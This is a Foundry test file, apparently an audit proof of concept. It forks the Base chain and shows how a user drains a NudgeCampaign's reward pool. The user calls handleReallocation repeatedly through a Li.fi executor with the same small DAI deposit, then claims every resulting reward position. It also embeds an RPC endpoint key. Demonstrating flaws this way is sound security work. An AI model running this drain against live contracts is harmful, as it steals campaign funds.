// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {NudgeCampaign} from "../campaign/NudgeCampaign.sol";
import {NudgeCampaignFactory} from "../campaign/NudgeCampaignFactory.sol";
import {INudgeCampaign, IBaseNudgeCampaign} from "../campaign/interfaces/INudgeCampaign.sol";
import "../mocks/TestERC20.sol";
import {console} from "forge-std/console.sol";

interface IExecutor {
    struct SwapData {
        address callTo;
        address approveTo;
        address sendingAssetId;
        address receivingAssetId;
        uint256 fromAmount;
        bytes callData;
        bool requiresDeposit;
    }

    function swapAndCompleteBridgeTokens(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver
    ) external;
    function swapAndExecute(
        bytes32 _transactionId,
        SwapData[] calldata _swapData,
        address _transferredAssetId,
        address payable _receiver,
        uint256 _amount
    ) external;
    function erc20Proxy() external returns (address);
}

contract ArchiveDebugerTest is Test {
    using Math for uint256;
    //@ Using this transaction as Fork sample
    //https://basescan.org/tx/0xe11e8013db2118413b91e9281dd253ab0cb4dcb3782567262ab362aebdb7d033

    address internal constant NATIVE_ASSETID = address(0); //address(0)

    NudgeCampaign public campaign = NudgeCampaign(payable(0x5d7d429deD731976774577d0cDa195B14c1f3EEb));
    NudgeCampaignFactory public factory = NudgeCampaignFactory(0xbe915C930437302162621ad948289F4DE84c9F20);
    IExecutor public executor = IExecutor(0x4DaC9d1769b9b304cb04741DCDEb2FC14aBdF110);

    ERC20 public USDC = ERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    ERC20 public DAI = ERC20(0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb);
    ERC20 public rewardToken;
    ERC20 public targetToken;

    address constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function setUp() public {
        //fork Base at 27754800
        uint256 forkBlock = 27754800;
        string memory rpcURL =
            "https://rpc.ankr.com/base/9f6e5db150bd7716e21a60eb9acc6f3909c10e43797deb81c8f8d9cc60dcaecc"; //@random free EVM account
        uint256 forkId = vm.createFork(rpcURL, forkBlock);
        vm.selectFork(forkId);

        (
            uint32 _holdingPeriodInSeconds,
            address _targetToken,
            address _rewardToken,
            uint256 _rewardPPQ,
            uint256 _startTimestamp,
            bool _isCampaignActive,
            uint256 _pendingRewards,
            uint256 _totalReallocatedAmount,
            uint256 _distributedRewards,
            uint256 _claimableRewards
        ) = campaign.getCampaignInfo();
        console.log("Forking Base");
        console.log("Holding Period: %s", _holdingPeriodInSeconds);
        console.log("Target Token: %s", _targetToken);
        console.log("Reward Token: %s", _rewardToken);
        console.log("Reward PPQ: %s", _rewardPPQ);
        console.log("Start Timestamp: %s", _startTimestamp);
        console.log("Is Campaign Active: %s", _isCampaignActive);
        console.log("Pending Rewards: %e", _pendingRewards);
        console.log("Total Reallocated Amount: %e", _totalReallocatedAmount);
        console.log("Distributed Rewards: %e", _distributedRewards);
        console.log("Claimable Rewards: %e", _claimableRewards);

        rewardToken = ERC20(_rewardToken);
        targetToken = ERC20(_targetToken);

        console.log("Total Rewards leftover: %e", rewardToken.balanceOf(address(campaign)));

        console.log("----------");

        assertEq(_targetToken, address(DAI), "wrong fork contract? target Token is not DAI");
        vm.label(address(campaign), "NudgeCampaign");
        vm.label(address(factory), "NudgeCampaignFactory");
        vm.label(address(executor), "Li.fi Executor");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(rewardToken), "RewardToken");
        vm.label(address(executor.erc20Proxy()), "Li.fi ERC20Proxy");
    }

    function test_debug() public {
        address user = makeAddr("User1");
        console.log("Test reallocate");
        uint256 claimable = campaign.claimableRewardAmount();
        uint256 split = 10;
        uint256 startingDAI = getTargetAmount(claimable) / split;
        console.log("starting claimable rewards: %e", claimable);
        //deal DAI to user
        deal(address(targetToken), user, startingDAI);
        vm.startPrank(user);
        console.log("user start with %e DAI", targetToken.balanceOf(user));



        targetToken.approve(executor.erc20Proxy(), type(uint256).max);
        //There is no escrow for Campaign, So user can repeatedly abuse to claim all rewards

        IExecutor.SwapData[] memory swapData = new IExecutor.SwapData[](1);
        uint256 campaignId = campaign.campaignId();
        bytes memory encodedHandleReallocation = abi.encodeWithSelector(
            NudgeCampaign.handleReallocation.selector, campaignId, user, address(targetToken), startingDAI, bytes("0x")
        );
        swapData[0] = IExecutor.SwapData({
            callTo: address(campaign),
            approveTo: address(campaign),
            sendingAssetId: address(targetToken),
            receivingAssetId: address(targetToken),
            fromAmount: startingDAI,
            callData: encodedHandleReallocation,
            requiresDeposit: false
        });


        uint[] memory pids = new uint[](split);
        console.log("--Start Draining rewards multiple times--");
        for (uint256 i = 0; i < split; i++) {
            executor.swapAndExecute(bytes32(0), swapData, address(targetToken), payable(user), startingDAI);
            pids[i] = campaign.pID();
        }
        //wait for the holding period
        skip(campaign.holdingPeriodInSeconds());

        campaign.claimRewards(pids);


        console.log("after campaign rewards balance: %e", campaign.claimableRewardAmount());
        console.log("end user DAI balance    : %e", targetToken.balanceOf(user));
        console.log("end user rewards balance: %e", rewardToken.balanceOf(user));
        //@all token have been drained from rewards with small amount of DAI
    }
    function getTargetAmount(uint256 fromAmount) public view returns (uint256) {
        uint256 scaledAmount = fromAmount * campaign.rewardScalingFactor();
        uint256 targetAmountScaled = scaledAmount.mulDiv(1e15,campaign.rewardPPQ() );
        return targetAmountScaled / campaign.targetScalingFactor();
    }
}
